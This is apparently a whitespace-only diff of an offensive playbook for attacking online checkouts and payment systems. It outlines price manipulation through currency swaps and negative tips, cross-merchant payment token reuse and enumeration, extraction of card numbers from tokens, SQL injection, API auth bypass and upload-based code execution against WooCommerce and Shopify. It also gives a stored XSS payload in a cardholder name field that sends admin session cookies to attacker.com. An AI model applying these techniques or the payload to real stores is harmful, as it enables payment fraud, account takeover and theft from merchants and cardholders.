@@ -31,7 +31,7 @@ B. Currency swap attack
    - Set currency to weak currency (VND, IDR)
    - Set amount to equivalent of USD price in weak currency
    - Server converts: if conversion is client-side, price manipulated
-   
+
 C. Tip field injection
    - Many checkouts have tip field (restaurant POS integration)
    - Inject negative tip to offset purchase price
@@ -50,7 +50,7 @@ A. Token reuse across merchants
    - Capture Stripe/Braintree token from one checkout
    - Submit token to different merchant using same gateway
    - Test: does gateway validate token belongs to this merchant?
-   
+
 B. Token ID manipulation
    - Enumerate token IDs (tok_1234, tok_1235...)
    - Test if tokens work across accounts
@@ -68,7 +68,7 @@ C. Token → PAN extraction
 A. Stored XSS in cardholder name
    Field: cardholder_name
    Payload: <img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
-   
+
    Trigger: when merchant admin views orders
    Exfil: admin session cookie → attacker server
 
@@ -137,7 +137,7 @@ WooCommerce endpoints:
 Attacks:
 1. SQLi in order ID parameter
    - GET /view-order/123' → error reveals SQL
-   
+
 2. Auth bypass via REST API
    - GET /wp-json/wc/v3/orders?consumer_key=xxx
    - Test: does API enforce auth properly?
@@ -145,7 +145,7 @@ Attacks:
 3. Plugin hook injection
    - WooCommerce has 100+ PHP hooks
    - If custom plugin exposes hooks unsafely: RCE
-   
+
 4. File upload in product import
    - CSV import with PHP payload
    - If server processes CSV as PHP: RCE
@@ -163,7 +163,7 @@ Attacks:
 1. Liquid template injection
    - {{ config.password | remove: "x" }}
    - If Shopify App renders user input in Liquid: XSS
-   
+
 2. Checkout ID enumeration
    - Shopify checkout IDs are sequential
    - Enumerate: /checkouts/1000, /checkouts/1001...
